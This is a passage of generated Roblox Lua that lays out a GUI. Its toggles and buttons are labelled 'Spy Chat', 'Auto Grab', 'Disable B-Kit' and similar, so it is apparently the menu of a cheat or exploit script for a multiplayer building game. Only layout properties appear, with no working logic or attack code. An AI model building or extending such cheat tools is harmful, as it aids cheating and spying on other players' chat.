G2L["255"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["255"]["Text"] = [[Main]];
G2L["255"]["Name"] = [[text]];
G2L["255"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.text
G2L["256"] = Instance.new("UIStroke", G2L["255"]);
G2L["256"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.UIPadding
G2L["257"] = Instance.new("UIPadding", G2L["255"]);
G2L["257"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.minimise
G2L["258"] = Instance.new("TextButton", G2L["254"]);
G2L["258"]["BorderSizePixel"] = 0;
G2L["258"]["TextTransparency"] = 0.3;
G2L["258"]["TextSize"] = 14;
G2L["258"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["258"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["258"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["258"]["BackgroundTransparency"] = 1;
G2L["258"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["258"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["258"]["Text"] = [[-]];
G2L["258"]["Name"] = [[minimise]];
G2L["258"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.greystroke
G2L["259"] = Instance.new("UIStroke", G2L["24e"]);
G2L["259"]["ZIndex"] = 99;
G2L["259"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["259"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["259"]["Name"] = [[greystroke]];
G2L["259"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat
G2L["25a"] = Instance.new("Frame", G2L["24e"]);
G2L["25a"]["BorderSizePixel"] = 0;
G2L["25a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25a"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["25a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["25a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25a"]["Name"] = [[spychat]];
G2L["25a"]["LayoutOrder"] = 2;
G2L["25a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button
G2L["25b"] = Instance.new("TextButton", G2L["25a"]);
G2L["25b"]["BorderSizePixel"] = 0;
G2L["25b"]["TextTransparency"] = 1;
G2L["25b"]["TextSize"] = 14;
G2L["25b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25b"]["BackgroundTransparency"] = 1;
G2L["25b"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["25b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25b"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.UIPadding
G2L["25c"] = Instance.new("UIPadding", G2L["25b"]);
G2L["25c"]["PaddingTop"] = UDim.new(0, 3);
G2L["25c"]["PaddingRight"] = UDim.new(0, 3);
G2L["25c"]["PaddingLeft"] = UDim.new(0, 3);
G2L["25c"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame
G2L["25d"] = Instance.new("Frame", G2L["25b"]);
G2L["25d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["25d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["25d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["25d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["25d"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.outlineStroke
G2L["25e"] = Instance.new("UIStroke", G2L["25d"]);
G2L["25e"]["Thickness"] = 2;
G2L["25e"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade
G2L["25f"] = Instance.new("CanvasGroup", G2L["25d"]);
G2L["25f"]["BorderSizePixel"] = 0;
G2L["25f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["25f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25f"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade.UIGradient
G2L["260"] = Instance.new("UIGradient", G2L["25f"]);
G2L["260"]["Rotation"] = 90;
G2L["260"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text
G2L["261"] = Instance.new("TextLabel", G2L["25a"]);
G2L["261"]["TextWrapped"] = true;
G2L["261"]["BorderSizePixel"] = 0;
G2L["261"]["TextSize"] = 14;
G2L["261"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["261"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["261"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["261"]["BackgroundTransparency"] = 1;
G2L["261"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["261"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["261"]["Text"] = [[Spy Chat]];
G2L["261"]["Name"] = [[text]];
G2L["261"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.UIPadding
G2L["262"] = Instance.new("UIPadding", G2L["261"]);
G2L["262"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.text
G2L["263"] = Instance.new("UIStroke", G2L["261"]);
G2L["263"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.UIPadding
G2L["264"] = Instance.new("UIPadding", G2L["25a"]);
G2L["264"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb
G2L["265"] = Instance.new("Frame", G2L["24e"]);
G2L["265"]["BorderSizePixel"] = 0;
G2L["265"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["265"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["265"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["265"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["265"]["Name"] = [[autograb]];
G2L["265"]["LayoutOrder"] = 2;
G2L["265"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button
G2L["266"] = Instance.new("TextButton", G2L["265"]);
G2L["266"]["BorderSizePixel"] = 0;
G2L["266"]["TextTransparency"] = 1;
G2L["266"]["TextSize"] = 14;
G2L["266"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["266"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["266"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["266"]["BackgroundTransparency"] = 1;
G2L["266"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["266"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["266"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.UIPadding
G2L["267"] = Instance.new("UIPadding", G2L["266"]);
G2L["267"]["PaddingTop"] = UDim.new(0, 3);
G2L["267"]["PaddingRight"] = UDim.new(0, 3);
G2L["267"]["PaddingLeft"] = UDim.new(0, 3);
G2L["267"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame
G2L["268"] = Instance.new("Frame", G2L["266"]);
G2L["268"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["268"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["268"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["268"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["268"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.outlineStroke
G2L["269"] = Instance.new("UIStroke", G2L["268"]);
G2L["269"]["Thickness"] = 2;
G2L["269"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade
G2L["26a"] = Instance.new("CanvasGroup", G2L["268"]);
G2L["26a"]["BorderSizePixel"] = 0;
G2L["26a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["26a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26a"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade.UIGradient
G2L["26b"] = Instance.new("UIGradient", G2L["26a"]);
G2L["26b"]["Rotation"] = 90;
G2L["26b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text
G2L["26c"] = Instance.new("TextLabel", G2L["265"]);
G2L["26c"]["TextWrapped"] = true;
G2L["26c"]["BorderSizePixel"] = 0;
G2L["26c"]["TextSize"] = 14;
G2L["26c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["26c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26c"]["BackgroundTransparency"] = 1;
G2L["26c"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["26c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26c"]["Text"] = [[Auto Grab]];
G2L["26c"]["Name"] = [[text]];
G2L["26c"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.UIPadding
G2L["26d"] = Instance.new("UIPadding", G2L["26c"]);
G2L["26d"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.text
G2L["26e"] = Instance.new("UIStroke", G2L["26c"]);
G2L["26e"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.UIPadding
G2L["26f"] = Instance.new("UIPadding", G2L["265"]);
G2L["26f"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound
G2L["270"] = Instance.new("Frame", G2L["24e"]);
G2L["270"]["BorderSizePixel"] = 0;
G2L["270"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["270"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["270"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["270"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["270"]["Name"] = [[disabledeletesound]];
G2L["270"]["LayoutOrder"] = 4;
G2L["270"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button
G2L["271"] = Instance.new("TextButton", G2L["270"]);
G2L["271"]["BorderSizePixel"] = 0;
G2L["271"]["TextTransparency"] = 1;
G2L["271"]["TextSize"] = 14;
G2L["271"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["271"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["271"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["271"]["ZIndex"] = 49;
G2L["271"]["BackgroundTransparency"] = 1;
G2L["271"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["271"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["271"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.UIPadding
G2L["272"] = Instance.new("UIPadding", G2L["271"]);
G2L["272"]["PaddingTop"] = UDim.new(0, 2);
G2L["272"]["PaddingRight"] = UDim.new(0, 3);
G2L["272"]["PaddingLeft"] = UDim.new(0, 3);
G2L["272"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame
G2L["273"] = Instance.new("Frame", G2L["271"]);
G2L["273"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["273"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["273"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["273"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["273"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade
G2L["274"] = Instance.new("CanvasGroup", G2L["273"]);
G2L["274"]["BorderSizePixel"] = 0;
G2L["274"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["274"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["274"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["274"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["274"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade.UIGradient
G2L["275"] = Instance.new("UIGradient", G2L["274"]);
G2L["275"]["Rotation"] = 90;
G2L["275"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.outlineStroke
G2L["276"] = Instance.new("UIStroke", G2L["273"]);
G2L["276"]["Thickness"] = 2;
G2L["276"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text
G2L["277"] = Instance.new("TextLabel", G2L["271"]);
G2L["277"]["ZIndex"] = 2;
G2L["277"]["BorderSizePixel"] = 0;
G2L["277"]["TextSize"] = 14;
G2L["277"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["277"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["277"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["277"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["277"]["BackgroundTransparency"] = 1;
G2L["277"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["277"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["277"]["Text"] = [[Disable Delete Sound]];
G2L["277"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text.text
G2L["278"] = Instance.new("UIStroke", G2L["277"]);
G2L["278"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.fillbar
G2L["279"] = Instance.new("Frame", G2L["270"]);
G2L["279"]["ZIndex"] = 90;
G2L["279"]["BorderSizePixel"] = 0;
G2L["279"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["279"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["279"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["279"]["Name"] = [[fillbar]];
G2L["279"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit
G2L["27a"] = Instance.new("Frame", G2L["24e"]);
G2L["27a"]["BorderSizePixel"] = 0;
G2L["27a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27a"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["27a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["27a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27a"]["Name"] = [[disablebkit]];
G2L["27a"]["LayoutOrder"] = 4;
G2L["27a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button
G2L["27b"] = Instance.new("TextButton", G2L["27a"]);
G2L["27b"]["BorderSizePixel"] = 0;
G2L["27b"]["TextTransparency"] = 1;
G2L["27b"]["TextSize"] = 14;
G2L["27b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27b"]["ZIndex"] = 49;
G2L["27b"]["BackgroundTransparency"] = 1;
G2L["27b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27b"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame
G2L["27c"] = Instance.new("Frame", G2L["27b"]);
G2L["27c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["27c"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["27c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["27c"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade
G2L["27d"] = Instance.new("CanvasGroup", G2L["27c"]);
G2L["27d"]["BorderSizePixel"] = 0;
G2L["27d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.buttonFade.UIGradient
G2L["27e"] = Instance.new("UIGradient", G2L["27d"]);
G2L["27e"]["Rotation"] = 90;
G2L["27e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.buttonFrame.outlineStroke
G2L["27f"] = Instance.new("UIStroke", G2L["27c"]);
G2L["27f"]["Thickness"] = 2;
G2L["27f"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text
G2L["280"] = Instance.new("TextLabel", G2L["27b"]);
G2L["280"]["ZIndex"] = 2;
G2L["280"]["BorderSizePixel"] = 0;
G2L["280"]["TextSize"] = 14;
G2L["280"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["280"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["280"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["280"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["280"]["BackgroundTransparency"] = 1;
G2L["280"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["280"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["280"]["Text"] = [[Disable B-Kit]];
G2L["280"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.text.text
G2L["281"] = Instance.new("UIStroke", G2L["280"]);
G2L["281"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.button.UIPadding
G2L["282"] = Instance.new("UIPadding", G2L["27b"]);
G2L["282"]["PaddingTop"] = UDim.new(0, 2);
G2L["282"]["PaddingRight"] = UDim.new(0, 3);
G2L["282"]["PaddingLeft"] = UDim.new(0, 3);
G2L["282"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkit.fillbar
G2L["283"] = Instance.new("Frame", G2L["27a"]);
G2L["283"]["ZIndex"] = 90;
G2L["283"]["BorderSizePixel"] = 0;
G2L["283"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["283"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["283"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["283"]["Name"] = [[fillbar]];
G2L["283"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---
G2L["284"] = Instance.new("Frame", G2L["24e"]);
G2L["284"]["BorderSizePixel"] = 0;
G2L["284"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["284"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["284"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["284"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["284"]["Name"] = [[---DIVIDER---]];
G2L["284"]["LayoutOrder"] = 3;
G2L["284"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame
G2L["285"] = Instance.new("Frame", G2L["284"]);
G2L["285"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["285"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["285"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["285"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["285"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade
G2L["286"] = Instance.new("CanvasGroup", G2L["285"]);
G2L["286"]["BorderSizePixel"] = 0;
G2L["286"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["286"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["286"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["286"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["286"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["287"] = Instance.new("UIGradient", G2L["286"]);
G2L["287"]["Rotation"] = 90;
G2L["287"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["288"] = Instance.new("UIStroke", G2L["285"]);
G2L["288"]["Thickness"] = 2;
G2L["288"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UIStroke
G2L["289"] = Instance.new("UIStroke", G2L["285"]);
G2L["289"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["289"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UICorner
G2L["28a"] = Instance.new("UICorner", G2L["285"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.UIPadding
G2L["28b"] = Instance.new("UIPadding", G2L["284"]);
G2L["28b"]["PaddingTop"] = UDim.new(0, 3);
G2L["28b"]["PaddingRight"] = UDim.new(0, 6);
G2L["28b"]["PaddingLeft"] = UDim.new(0, 6);
G2L["28b"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick
G2L["28c"] = Instance.new("Frame", G2L["24e"]);
G2L["28c"]["BorderSizePixel"] = 0;
G2L["28c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28c"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["28c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["28c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28c"]["Name"] = [[fixbrick]];
G2L["28c"]["LayoutOrder"] = 4;
G2L["28c"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button
G2L["28d"] = Instance.new("TextButton", G2L["28c"]);
G2L["28d"]["BorderSizePixel"] = 0;
G2L["28d"]["TextTransparency"] = 1;
G2L["28d"]["TextSize"] = 14;
G2L["28d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28d"]["ZIndex"] = 49;
G2L["28d"]["BackgroundTransparency"] = 1;
G2L["28d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28d"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame
G2L["28e"] = Instance.new("Frame", G2L["28d"]);
G2L["28e"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["28e"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["28e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28e"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["28e"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade
G2L["28f"] = Instance.new("CanvasGroup", G2L["28e"]);
G2L["28f"]["BorderSizePixel"] = 0;
G2L["28f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
